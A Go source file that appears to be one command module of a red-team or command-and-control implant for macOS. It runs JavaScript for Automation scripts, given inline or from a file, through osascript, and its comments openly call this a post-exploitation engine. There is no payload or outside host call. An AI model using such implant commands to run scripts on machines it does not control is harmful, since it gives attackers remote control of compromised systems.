//go:build darwin

package commands

import (
	"context"
	"os"
	"os/exec"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

// JXACommand executes JavaScript for Automation (JXA) scripts on macOS.
// JXA provides access to macOS automation APIs (Foundation, AppKit, Security)
// via JavaScript, making it a powerful post-exploitation scripting engine.
type JXACommand struct{}

func (c *JXACommand) Name() string {
	return "jxa"
}

func (c *JXACommand) Description() string {
	return "Execute JavaScript for Automation (JXA) scripts on macOS (T1059.007)"
}

type jxaArgs struct {
	Code    string `json:"code"`
	File    string `json:"file"`
	Timeout int    `json:"timeout"`
}

const defaultJXATimeout = 60 // seconds

func (c *JXACommand) Execute(task structs.Task) structs.CommandResult {
	args, parseErr := unmarshalParams[jxaArgs](task)
	if parseErr != nil {
		return *parseErr
	}

	if args.Code == "" && args.File == "" {
		return errorResult("Error: must specify either -code (inline script) or -file (script path)")
	}

	if args.Code != "" && args.File != "" {
		return errorResult("Error: specify either -code or -file, not both")
	}

	timeout := args.Timeout
	if timeout <= 0 {
		timeout = defaultJXATimeout
	}

	var script string
	if args.File != "" {
		data, err := os.ReadFile(args.File)
		if err != nil {
			return errorf("Error reading script file: %v", err)
		}
		script = string(data)
	} else {
		script = args.Code
	}

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeout)*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, "osascript", "-l", "JavaScript", "-e", script)
	out, err := cmd.CombinedOutput()
	output := strings.TrimSpace(string(out))

	if err != nil {
		if ctx.Err() == context.DeadlineExceeded {
			return errorf("Script timed out after %d seconds", timeout)
		}
		if output != "" {
			return errorf("JXA error: %s\n%v", output, err)
		}
		return errorf("JXA execution failed: %v", err)
	}

	if output == "" {
		output = "Script executed successfully (no output)"
	}

	return successResult(output)
}
